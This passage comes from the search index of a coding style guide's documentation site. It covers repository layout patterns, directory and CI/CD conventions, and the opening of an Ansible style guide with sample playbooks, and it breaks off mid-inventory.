trigger MAJOR version bumps.</p>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#references","title":"References","text":"<ul> <li>Semantic Versioning</li> <li>Keep a Changelog</li> <li>The Zen of Python</li> <li>Google Style Guides</li> <li>Infrastructure as Code Best Practices</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/structure/","title":"Repository Structure","text":"","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#this-style-guides-structure-monorepo","title":"This Style Guide's Structure (Monorepo)","text":"<p>This style guide itself is organized as a monorepo containing all language guides, templates, schemas, and tooling in a single repository. This approach enables:</p> <ul> <li>Centralized versioning: All guides evolve together with unified semantic versioning</li> <li>Shared tooling: Validation scripts, CI/CD pipelines, and container images are reused</li> <li>Consistency: Cross-references between guides remain in-sync</li> <li>Single source of truth: Documentation portal builds from one repository</li> </ul>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#directory-layout","title":"Directory Layout","text":"<pre><code>coding-style-guide/\n\u251c\u2500\u2500 docs/                           # MkDocs documentation source\n\u2502   \u251c\u2500\u2500 01_overview/               # General principles and governance\n\u2502   \u2502   \u251c\u2500\u2500 principles.md          # Core principles\n\u2502   \u2502   \u251c\u2500\u2500 governance.md          # GitFlow and versioning\n\u2502   \u2502   \u2514\u2500\u2500 structure.md           # This file\n\u2502   \u251c\u2500\u2500 02_language_guides/        # Language-specific style guides\n\u2502   \u2502   \u251c\u2500\u2500 python.md\n\u2502   \u2502   \u251c\u2500\u2500 terraform.md\n\u2502   \u2502   \u251c\u2500\u2500 bash.md\n\u2502   \u2502   \u251c\u2500\u2500 typescript.md\n\u2502   \u2502   \u2514\u2500\u2500 ...\n\u2502   \u251c\u2500\u2500 03_metadata_schema/        # Schema documentation\n\u2502   \u251c\u2500\u2500 04_templates/              # Document templates\n\u2502   \u251c\u2500\u2500 05_ci_cd/                  # CI/CD patterns\n\u2502   \u251c\u2500\u2500 06_container/              # Container usage\n\u2502   \u251c\u2500\u2500 07_integration/            # Integration guides\n\u2502   \u2514\u2500\u2500 index.md                   # Documentation home\n\u251c\u2500\u2500 .github/                        # GitHub workflows and actions\n\u2502   \u251c\u2500\u2500 workflows/                 # CI/CD workflows\n\u2502   \u2502   \u251c\u2500\u2500 ci.yml\n\u2502   \u2502   \u251c\u2500\u2500 deploy.yml\n\u2502   \u2502   \u2514\u2500\u2500 container.yml\n\u2502   \u2514\u2500\u2500 actions/                   # Custom GitHub actions\n\u2502       \u2514\u2500\u2500 validate/              # Validation action\n\u251c\u2500\u2500 scripts/                        # Validation and automation scripts\n\u2502   \u251c\u2500\u2500 validate_metadata.py       # Metadata validation\n\u2502   \u2514\u2500\u2500 ...\n\u251c\u2500\u2500 Dockerfile                      # Container definition\n\u251c\u2500\u2500 docker-compose.yml             # Local development\n\u251c\u2500\u2500 docker-entrypoint.sh           # Container entry point\n\u251c\u2500\u2500 mkdocs.yml                     # Documentation configuration\n\u251c\u2500\u2500 pyproject.toml                 # Python project config\n\u2514\u2500\u2500 README.md                      # Repository overview\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#visual-repository-structure","title":"Visual Repository Structure","text":"<pre><code>graph TD\n    Root[coding-style-guide/] --&gt; Docs[docs/]\n    Root --&gt; GitHub[.github/]\n    Root --&gt; Scripts[scripts/]\n    Root --&gt; Config[Configuration Files]\n\n    Docs --&gt; Overview[01_overview/]\n    Docs --&gt; Languages[02_language_guides/]\n    Docs --&gt; Schema[03_metadata_schema/]\n    Docs --&gt; Templates[04_templates/]\n    Docs --&gt; CICD[05_ci_cd/]\n    Docs --&gt; Examples[05_examples/]\n    Docs --&gt; Container[06_container/]\n    Docs --&gt; Integration[07_integration/]\n    Docs --&gt; AntiPatterns[08_anti_patterns/]\n    Docs --&gt; Refactoring[09_refactoring/]\n\n    Overview --&gt; Principles[principles.md]\n    Overview --&gt; Governance[governance.md]\n    Overview --&gt; Structure[structure.md]\n\n    Languages --&gt; Python[python.md]\n    Languages --&gt; Terraform[terraform.md]\n    Languages --&gt; TypeScript[typescript.md]\n    Languages --&gt; Bash[bash.md]\n    Languages --&gt; MoreLangs[...]\n\n    GitHub --&gt; Workflows[workflows/]\n    GitHub --&gt; Actions[actions/]\n\n    Workflows --&gt; CI[ci.yml]\n    Workflows --&gt; Deploy[deploy.yml]\n    Workflows --&gt; ContainerBuild[container.yml]\n\n    Config --&gt; MkDocs[mkdocs.yml]\n    Config --&gt; PyProject[pyproject.toml]\n    Config --&gt; Docker[Dockerfile]\n    Config --&gt; Compose[docker-compose.yml]\n\n    style Root fill:#e3f2fd\n    style Docs fill:#f3e5f5\n    style GitHub fill:#e8f5e9\n    style Scripts fill:#fff3e0\n    style Config fill:#fce4ec</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#why-monorepo-for-this-project","title":"Why Monorepo for This Project?","text":"<p>The monorepo structure is ideal for this style guide because:</p> <ol> <li>Unified releases: All guides release together with consistent versioning (<code>v1.0.0</code>)</li> <li>Cross-language consistency: Python, Terraform, and Bash guides reference common metadata schemas</li> <li>Shared validation: All languages use the same metadata validation scripts</li> <li>Simplified CI/CD: One pipeline validates all content</li> <li>Single documentation site: MkDocs builds all guides into one portal</li> </ol>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#recommended-repository-structures","title":"Recommended Repository Structures","text":"<p>When implementing these standards in your projects, choose the organizational pattern that fits your team and project needs.</p>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#pattern-1-monorepo-recommended-for-multi-service-projects","title":"Pattern 1: Monorepo (Recommended for Multi-Service Projects)","text":"<p>Use when:</p> <ul> <li>Managing multiple related services (microservices)</li> <li>Sharing common libraries or infrastructure code</li> <li>Team needs atomic cross-service changes</li> <li>Unified deployment pipelines are valuable</li> </ul> <p>Structure:</p> <pre><code>project-name/\n\u251c\u2500\u2500 services/\n\u2502   \u251c\u2500\u2500 api/\n\u2502   \u2502   \u251c\u2500\u2500 src/\n\u2502   \u2502   \u251c\u2500\u2500 tests/\n\u2502   \u2502   \u251c\u2500\u2500 README.md\n\u2502   \u2502   \u2514\u2500\u2500 pyproject.toml\n\u2502   \u251c\u2500\u2500 worker/\n\u2502   \u2502   \u251c\u2500\u2500 src/\n\u2502   \u2502   \u251c\u2500\u2500 tests/\n\u2502   \u2502   \u2514\u2500\u2500 README.md\n\u2502   \u2514\u2500\u2500 frontend/\n\u2502       \u251c\u2500\u2500 src/\n\u2502       \u251c\u2500\u2500 tests/\n\u2502       \u2514\u2500\u2500 package.json\n\u251c\u2500\u2500 infrastructure/\n\u2502   \u251c\u2500\u2500 terraform/\n\u2502   \u2502   \u251c\u2500\u2500 modules/\n\u2502   \u2502   \u2514\u2500\u2500 environments/\n\u2502   \u2514\u2500\u2500 kubernetes/\n\u2502       \u251c\u2500\u2500 base/\n\u2502       \u2514\u2500\u2500 overlays/\n\u251c\u2500\u2500 shared/\n\u2502   \u251c\u2500\u2500 libraries/\n\u2502   \u2514\u2500\u2500 schemas/\n\u251c\u2500\u2500 docs/\n\u2502   \u251c\u2500\u2500 architecture/\n\u2502   \u251c\u2500\u2500 runbooks/\n\u2502   \u2514\u2500\u2500 index.md\n\u251c\u2500\u2500 .github/\n\u2502   \u2514\u2500\u2500 workflows/\n\u251c\u2500\u2500 Makefile\n\u2514\u2500\u2500 README.md\n</code></pre> <p>Visual Structure:</p> <pre><code>graph TD\n    MonoRoot[Monorepo Root] --&gt; Services[services/]\n    MonoRoot --&gt; Infra[infrastructure/]\n    MonoRoot --&gt; Shared[shared/]\n    MonoRoot --&gt; Docs[docs/]\n    MonoRoot --&gt; GitHub[.github/]\n\n    Services --&gt; API[api/]\n    Services --&gt; Worker[worker/]\n    Services --&gt; Frontend[frontend/]\n\n    API --&gt; APISrc[src/]\n    API --&gt; APITests[tests/]\n    API --&gt; APIDocs[README.md]\n\n    Infra --&gt; TF[terraform/]\n    Infra --&gt; K8s[kubernetes/]\n\n    TF --&gt; Modules[modules/]\n    TF --&gt; Envs[environments/]\n\n    Shared --&gt; Libs[libraries/]\n    Shared --&gt; Schemas[schemas/]\n\n    style MonoRoot fill:#e3f2fd\n    style Services fill:#f3e5f5\n    style Infra fill:#e8f5e9\n    style Shared fill:#fff3e0\n    style Docs fill:#fce4ec</code></pre> <p>Benefits:</p> <ul> <li>Atomic commits across services</li> <li>Shared dependency management</li> <li>Single source of truth</li> <li>Easier refactoring</li> </ul> <p>Trade-offs:</p> <ul> <li>Larger repository size</li> <li>CI/CD must handle selective builds</li> <li>Access control is all-or-nothing</li> </ul>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#pattern-2-multi-repo-recommended-for-independent-services","title":"Pattern 2: Multi-Repo (Recommended for Independent Services)","text":"<p>Use when:</p> <ul> <li>Services are independently deployed</li> <li>Different teams own different services</li> <li>Fine-grained access control needed</li> <li>Services have different release cadences</li> </ul> <p>Structure (per repository):</p> <pre><code>service-name/\n\u251c\u2500\u2500 src/\n\u2502   \u251c\u2500\u2500 main/\n\u2502   \u2514\u2500\u2500 test/\n\u251c\u2500\u2500 docs/\n\u2502   \u251c\u2500\u2500 api/\n\u2502   \u251c\u2500\u2500 deployment/\n\u2502   \u2514\u2500\u2500 README.md\n\u251c\u2500\u2500 infrastructure/\n\u2502   \u2514\u2500\u2500 terraform/\n\u251c\u2500\u2500 .github/\n\u2502   \u2514\u2500\u2500 workflows/\n\u251c\u2500\u2500 scripts/\n\u251c\u2500\u2500 Dockerfile\n\u251c\u2500\u2500 Makefile\n\u2514\u2500\u2500 README.md\n</code></pre> <p>Visual Comparison:</p> <pre><code>graph LR\n    subgraph MultiRepo[\" Multi-Repository Pattern \"]\n        Repo1[api-service&lt;br/&gt;Repository]\n        Repo2[worker-service&lt;br/&gt;Repository]\n        Repo3[frontend-app&lt;br/&gt;Repository]\n        Repo4[infrastructure&lt;br/&gt;Repository]\n    end\n\n    Repo1 -.-&gt;|References| Repo4\n    Repo2 -.-&gt;|References| Repo4\n    Repo3 -.-&gt;|References| Repo4\n\n    Repo1 --&gt;|Independent&lt;br/&gt;Deployment| Deploy1[Deploy API]\n    Repo2 --&gt;|Independent&lt;br/&gt;Deployment| Deploy2[Deploy Worker]\n    Repo3 --&gt;|Independent&lt;br/&gt;Deployment| Deploy3[Deploy Frontend]\n\n    style Repo1 fill:#e3f2fd\n    style Repo2 fill:#f3e5f5\n    style Repo3 fill:#e8f5e9\n    style Repo4 fill:#fff3e0</code></pre> <p>Benefits:</p> <ul> <li>Clear ownership boundaries</li> <li>Independent release cycles</li> <li>Smaller, focused repositories</li> <li>Granular access control</li> </ul> <p>Trade-offs:</p> <ul> <li>Cross-service changes require multiple PRs</li> <li>Dependency version mismatches possible</li> <li>Duplicated CI/CD configuration</li> </ul>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#pattern-3-hybrid-infrastructure-monorepo-service-multi-repo","title":"Pattern 3: Hybrid (Infrastructure Monorepo + Service Multi-Repo)","text":"<p>Use when:</p> <ul> <li>Infrastructure is shared across services</li> <li>Services are independently owned</li> <li>Centralized infrastructure governance needed</li> </ul> <p>Infrastructure Repository:</p> <pre><code>infrastructure/\n\u251c\u2500\u2500 terraform/\n\u2502   \u251c\u2500\u2500 modules/\n\u2502   \u2502   \u251c\u2500\u2500 networking/\n\u2502   \u2502   \u251c\u2500\u2500 compute/\n\u2502   \u2502   \u2514\u2500\u2500 database/\n\u2502   \u2514\u2500\u2500 environments/\n\u2502       \u251c\u2500\u2500 dev/\n\u2502       \u251c\u2500\u2500 staging/\n\u2502       \u2514\u2500\u2500 prod/\n\u251c\u2500\u2500 kubernetes/\n\u2502   \u251c\u2500\u2500 clusters/\n\u2502   \u2514\u2500\u2500 shared-manifests/\n\u251c\u2500\u2500 ansible/\n\u2502   \u2514\u2500\u2500 playbooks/\n\u251c\u2500\u2500 docs/\n\u2514\u2500\u2500 README.md\n</code></pre> <p>Service Repositories:</p> <ul> <li>Each service in its own repository</li> <li>Services reference infrastructure modules via Git tags</li> <li>Terraform modules versioned and published</li> </ul> <p>Benefits:</p> <ul> <li>Centralized infrastructure governance</li> <li>Service independence</li> <li>Reusable infrastructure modules</li> </ul> <p>Trade-offs:</p> <ul> <li>Coordination needed for infrastructure changes</li> <li>Module versioning overhead</li> </ul>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#directory-standards","title":"Directory Standards","text":"<p>Regardless of organizational pattern, follow these directory conventions:</p>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#required-top-level-directories","title":"Required Top-Level Directories","text":"<pre><code>project/\n\u251c\u2500\u2500 src/           # Source code (or services/ for monorepo)\n\u251c\u2500\u2500 tests/         # Tests (mirror src/ structure)\n\u251c\u2500\u2500 docs/          # Documentation (MkDocs recommended)\n\u251c\u2500\u2500 scripts/       # Automation scripts\n\u2514\u2500\u2500 infrastructure/ # IaC code (Terraform, K8s manifests)\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#optional-directories","title":"Optional Directories","text":"<pre><code>\u251c\u2500\u2500 .github/       # GitHub-specific (workflows, CODEOWNERS)\n\u251c\u2500\u2500 templates/     # Project templates\n\u251c\u2500\u2500 examples/      # Usage examples\n\u251c\u2500\u2500 tools/         # Development tools\n\u2514\u2500\u2500 config/        # Configuration files\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#naming-conventions","title":"Naming Conventions","text":"<ul> <li>Lowercase with hyphens: <code>my-service/</code>, <code>api-gateway/</code></li> <li>Descriptive names: <code>user-authentication-service/</code> not <code>service-1/</code></li> <li>Consistent plurals: <code>services/</code>, <code>modules/</code>, <code>scripts/</code></li> </ul>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#file-organization-best-practices","title":"File Organization Best Practices","text":"","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#1-colocate-related-files","title":"1. Colocate Related Files","text":"<p>Keep related files together:</p> <pre><code>src/\n\u2514\u2500\u2500 user-authentication/\n    \u251c\u2500\u2500 service.py          # Core implementation\n    \u251c\u2500\u2500 service_test.py     # Tests\n    \u251c\u2500\u2500 README.md           # Module documentation\n    \u2514\u2500\u2500 schema.json         # Data schema\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#2-separate-source-from-configuration","title":"2. Separate Source from Configuration","text":"<pre><code>project/\n\u251c\u2500\u2500 src/                    # Application code\n\u251c\u2500\u2500 config/                 # Configuration files\n\u2502   \u251c\u2500\u2500 development.yaml\n\u2502   \u251c\u2500\u2500 staging.yaml\n\u2502   \u2514\u2500\u2500 production.yaml\n\u2514\u2500\u2500 infrastructure/         # Infrastructure as Code\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#3-use-clear-test-directories","title":"3. Use Clear Test Directories","text":"<p>Option A: Mirrored Structure (Recommended for Python, TypeScript)</p> <pre><code>src/\n\u251c\u2500\u2500 api/\n\u2502   \u251c\u2500\u2500 users.py\n\u2502   \u2514\u2500\u2500 posts.py\ntests/\n\u251c\u2500\u2500 api/\n\u2502   \u251c\u2500\u2500 test_users.py\n\u2502   \u2514\u2500\u2500 test_posts.py\n</code></pre> <p>Option B: Colocated Tests (Recommended for Go, Rust)</p> <pre><code>src/\n\u251c\u2500\u2500 api/\n\u2502   \u251c\u2500\u2500 users.go\n\u2502   \u251c\u2500\u2500 users_test.go\n\u2502   \u251c\u2500\u2500 posts.go\n\u2502   \u2514\u2500\u2500 posts_test.go\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#4-documentation-structure","title":"4. Documentation Structure","text":"<p>Use MkDocs-compatible structure:</p> <pre><code>docs/\n\u251c\u2500\u2500 index.md               # Home page\n\u251c\u2500\u2500 getting-started/\n\u2502   \u251c\u2500\u2500 installation.md\n\u2502   \u2514\u2500\u2500 quickstart.md\n\u251c\u2500\u2500 guides/\n\u2502   \u251c\u2500\u2500 deployment.md\n\u2502   \u2514\u2500\u2500 configuration.md\n\u251c\u2500\u2500 api/\n\u2502   \u2514\u2500\u2500 reference.md\n\u2514\u2500\u2500 architecture/\n    \u251c\u2500\u2500 overview.md\n    \u2514\u2500\u2500 decisions/         # ADRs (Architecture Decision Records)\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#infrastructure-as-code-organization","title":"Infrastructure as Code Organization","text":"","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#terraformterragrunt","title":"Terraform/Terragrunt","text":"<pre><code>infrastructure/\n\u251c\u2500\u2500 terraform/\n\u2502   \u251c\u2500\u2500 modules/           # Reusable modules\n\u2502   \u2502   \u251c\u2500\u2500 vpc/\n\u2502   \u2502   \u251c\u2500\u2500 ecs-service/\n\u2502   \u2502   \u2514\u2500\u2500 rds/\n\u2502   \u2514\u2500\u2500 environments/      # Environment-specific configs\n\u2502       \u251c\u2500\u2500 dev/\n\u2502       \u2502   \u251c\u2500\u2500 terragrunt.hcl\n\u2502       \u2502   \u2514\u2500\u2500 terraform.tfvars\n\u2502       \u251c\u2500\u2500 staging/\n\u2502       \u2514\u2500\u2500 prod/\n\u2514\u2500\u2500 docs/\n    \u2514\u2500\u2500 infrastructure.md\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#kubernetes","title":"Kubernetes","text":"<pre><code>infrastructure/\n\u251c\u2500\u2500 kubernetes/\n\u2502   \u251c\u2500\u2500 base/              # Kustomize base\n\u2502   \u2502   \u251c\u2500\u2500 deployment.yaml\n\u2502   \u2502   \u2514\u2500\u2500 service.yaml\n\u2502   \u2514\u2500\u2500 overlays/          # Environment overlays\n\u2502       \u251c\u2500\u2500 dev/\n\u2502       \u251c\u2500\u2500 staging/\n\u2502       \u2514\u2500\u2500 prod/\n\u2514\u2500\u2500 helm/                  # Helm charts\n    \u2514\u2500\u2500 app-chart/\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#cicd-organization","title":"CI/CD Organization","text":"","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#github-actions","title":"GitHub Actions","text":"<pre><code>.github/\n\u251c\u2500\u2500 workflows/\n\u2502   \u251c\u2500\u2500 ci.yml             # Continuous integration\n\u2502   \u251c\u2500\u2500 cd-dev.yml         # Deploy to dev\n\u2502   \u251c\u2500\u2500 cd-prod.yml        # Deploy to production\n\u2502   \u2514\u2500\u2500 validate.yml       # Pre-commit validation\n\u251c\u2500\u2500 actions/               # Custom actions\n\u2502   \u2514\u2500\u2500 validate-style/\n\u2514\u2500\u2500 CODEOWNERS            # Code ownership\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#gitlab-ci","title":"GitLab CI","text":"<pre><code>.gitlab/\n\u251c\u2500\u2500 ci/\n\u2502   \u251c\u2500\u2500 lint.yml\n\u2502   \u251c\u2500\u2500 test.yml\n\u2502   \u2514\u2500\u2500 deploy.yml\n\u2514\u2500\u2500 .gitlab-ci.yml         # Main pipeline config\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#version-control-patterns","title":"Version Control Patterns","text":"","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#branch-structure-gitflow","title":"Branch Structure (GitFlow)","text":"<pre><code>main                       # Production-ready code\n\u251c\u2500\u2500 develop                # Integration branch\n\u251c\u2500\u2500 feature/               # Feature branches\n\u2502   \u251c\u2500\u2500 add-user-auth\n\u2502   \u2514\u2500\u2500 improve-logging\n\u251c\u2500\u2500 fix/                   # Bug fix branches\n\u2502   \u2514\u2500\u2500 fix-login-error\n\u2514\u2500\u2500 release/               # Release preparation\n    \u2514\u2500\u2500 v1.2.0\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#tagging-convention","title":"Tagging Convention","text":"<ul> <li>Releases: <code>v1.0.0</code>, <code>v1.1.0</code>, <code>v2.0.0</code> (semantic versioning)</li> <li>Pre-releases: <code>v1.0.0-rc.1</code>, <code>v1.0.0-beta.2</code></li> <li>Module versions: <code>terraform/vpc/v1.0.0</code></li> </ul>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#makefile-organization","title":"Makefile Organization","text":"<p>Centralize common tasks in a <code>Makefile</code>:</p> <pre><code>.PHONY: help lint test build deploy clean\n\nhelp:\n @echo \"Available targets:\"\n @echo \"  lint      - Run linters\"\n @echo \"  test      - Run tests\"\n @echo \"  build     - Build container\"\n @echo \"  deploy    - Deploy to environment\"\n\nlint:\n @pre-commit run --all-files\n\ntest:\n @pytest tests/\n\nbuild:\n @docker build -t myapp:latest .\n\ndeploy:\n @./scripts/deploy.sh $(ENV)\n</code></pre>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#migration-strategies","title":"Migration Strategies","text":"","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#from-multi-repo-to-monorepo","title":"From Multi-Repo to Monorepo","text":"<ol> <li>Create new monorepo structure</li> <li>Import each repository as subdirectory preserving history:</li> </ol> <pre><code>git subtree add --prefix services/api api-repo main\n</code></pre> <ol> <li>Update CI/CD for monorepo patterns (selective builds)</li> <li>Migrate documentation to unified MkDocs</li> </ol>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#from-monorepo-to-multi-repo","title":"From Monorepo to Multi-Repo","text":"<ol> <li>Extract each service with history:</li> </ol> <pre><code>git subtree split --prefix services/api -b api-split\n</code></pre> <ol> <li>Create new repository from split branch</li> <li>Update cross-repo references to use Git tags</li> <li>Set up cross-repo CI/CD coordination</li> </ol>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#examples-and-templates","title":"Examples and Templates","text":"<p>The style guide provides examples and templates under:</p> <ul> <li>Templates: <code>docs/04_templates/</code> - README templates, module templates</li> <li>Examples: Future section for reference implementations</li> </ul>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"01_overview/structure/#references","title":"References","text":"<ul> <li>Monorepo vs Multi-Repo Patterns</li> <li>MkDocs Material Documentation</li> <li>GitFlow Workflow</li> <li>Semantic Versioning</li> </ul>","tags":["structure","organization","repository-layout","monorepo","multi-repo","best-practices"]},{"location":"02_language_guides/ansible/","title":"Ansible Style Guide","text":"","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#language-overview","title":"Language Overview","text":"<p>Ansible is an agentless configuration management and automation platform that uses YAML-based playbooks to define infrastructure as code. Modern Ansible development emphasizes collections over standalone roles.</p>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: Declarative configuration management</li> <li>Language: YAML with Jinja2 templating</li> <li>Architecture: Agentless (SSH/WinRM)</li> <li>Version Support: Ansible 2.15.x through 2.17.x</li> <li>Modern Approach: Collections-first (not standalone roles)</li> </ul>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#primary-use-cases","title":"Primary Use Cases","text":"<ul> <li>Configuration management</li> <li>Application deployment</li> <li>Infrastructure provisioning</li> <li>Security and compliance automation</li> <li>Orchestration and workflow automation</li> </ul>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Naming Playbooks <code>kebab-case.yml</code> <code>deploy-app.yml</code>, <code>configure-server.yml</code> Descriptive, lowercase Roles <code>snake_case</code> <code>web_server</code>, <code>database_setup</code> Lowercase with underscores Variables <code>snake_case</code> <code>app_port</code>, <code>db_host</code> Descriptive variable names Collections <code>namespace.collection</code> <code>community.general</code>, <code>ansible.builtin</code> Namespace required Structure Collections Use collections <code>community.general.docker_container</code> Modern approach Playbook YAML list of plays <code>- name: Configure servers</code> List of plays Tasks YAML task list <code>- name: Install package</code> Descriptive task names Files Playbook <code>playbook-name.yml</code> <code>site.yml</code>, <code>deploy.yml</code> Main playbooks Inventory <code>inventory.yml</code> or <code>hosts</code> <code>inventory/production.yml</code> Host definitions Variables <code>group_vars/</code>, <code>host_vars/</code> <code>group_vars/webservers.yml</code> Variable organization Roles Dir <code>roles/role_name/</code> <code>roles/web_server/tasks/main.yml</code> Standard role structure Best Practices Idempotency Always idempotent Use <code>state: present</code> Tasks can run multiple times Task Names Always name tasks <code>name: Install Nginx</code> Clear, descriptive names Collections Fully qualified <code>ansible.builtin.copy</code> Use FQCN (Fully Qualified Collection Name) Variables Prefix role vars <code>rolename_variable</code> Avoid collisions Syntax Module Args YAML dict <code>state: present\\n  name: nginx</code> Key-value pairs When Conditional <code>when: ansible_os_family == \"Debian\"</code> Jinja2 conditions Loop <code>loop</code> keyword <code>loop: \"{{ users }}\"</code> Iterate over items Handlers Notify handlers <code>notify: Restart nginx</code> Triggered on changes","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#collections-first-approach","title":"Collections-First Approach","text":"<p>Use Ansible Collections instead of standalone roles:</p> <pre><code>## Good - Using collection\n---\n- name: Configure web servers\n  hosts: webservers\n  tasks:\n    - name: Install nginx\n      ansible.builtin.package:\n        name: nginx\n        state: present\n\n    - name: Deploy website\n      ansible.builtin.template:\n        src: index.html.j2\n        dest: /var/www/html/index.html\n\n## Install collections from Ansible Galaxy\nansible-galaxy collection install community.general\nansible-galaxy collection install ansible.posix\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#collection-structure","title":"Collection Structure","text":"<pre><code>my_namespace.my_collection/\n\u251c\u2500\u2500 galaxy.yml\n\u251c\u2500\u2500 plugins/\n\u2502   \u251c\u2500\u2500 modules/\n\u2502   \u251c\u2500\u2500 inventory/\n\u2502   \u2514\u2500\u2500 filter/\n\u251c\u2500\u2500 roles/\n\u2502   \u2514\u2500\u2500 my_role/\n\u2502       \u251c\u2500\u2500 defaults/\n\u2502       \u251c\u2500\u2500 tasks/\n\u2502       \u251c\u2500\u2500 handlers/\n\u2502       \u2514\u2500\u2500 meta/\n\u2514\u2500\u2500 playbooks/\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#playbook-structure","title":"Playbook Structure","text":"","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#basic-playbook","title":"Basic Playbook","text":"<pre><code>---\n## @module web_server_deployment\n## @description Deploy and configure nginx web servers\n## @dependencies ansible.builtin, community.general\n## @version 1.0.0\n## @author Tyler Dukes\n## @last_updated 2025-10-28\n\n- name: Configure web servers\n  hosts: webservers\n  become: true\n  vars:\n    nginx_port: 80\n    document_root: /var/www/html\n\n  tasks:\n    - name: Install nginx\n      ansible.builtin.package:\n        name: nginx\n        state: present\n\n    - name: Start and enable nginx\n      ansible.builtin.service:\n        name: nginx\n        state: started\n        enabled: true\n\n    - name: Deploy website content\n      ansible.builtin.copy:\n        content: |\n          &lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello World&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n        dest: \"{{ document_root }}/index.html\"\n        mode: '0644'\n      notify: Reload nginx\n\n  handlers:\n    - name: Reload nginx\n      ansible.builtin.service:\n        name: nginx\n        state: reloaded\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#multi-play-playbook","title":"Multi-Play Playbook","text":"<pre><code>---\n- name: Prepare database servers\n  hosts: dbservers\n  become: true\n  tasks:\n    - name: Install PostgreSQL\n      ansible.builtin.package:\n        name: postgresql-server\n        state: present\n\n- name: Configure application servers\n  hosts: appservers\n  become: true\n  vars_files:\n    - vars/app_config.yml\n  tasks:\n    - name: Deploy application\n      ansible.builtin.include_role:\n        name: my_namespace.my_collection.app_deployment\n\n- name: Update load balancers\n  hosts: loadbalancers\n  become: true\n  serial: 1\n  tasks:\n    - name: Update nginx configuration\n      ansible.builtin.template:\n        src: nginx.conf.j2\n        dest: /etc/nginx/nginx.conf\n      notify: Reload nginx\n</code></pre>","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#inventory-organization","title":"Inventory Organization","text":"","tags":["ansible","configuration-management","automation","devops","collections"]},{"location":"02_language_guides/ansible/#static-inventory-ini-format","title":"Static Inventory (INI format)","text":"<pre><code>## inventory/production.ini\n[webservers]\nweb1.example.com ansible_host=192.168.1.10\nweb2.example.com ansible_host=192.168.1.11\n\n[dbservers]\ndb1.example.com 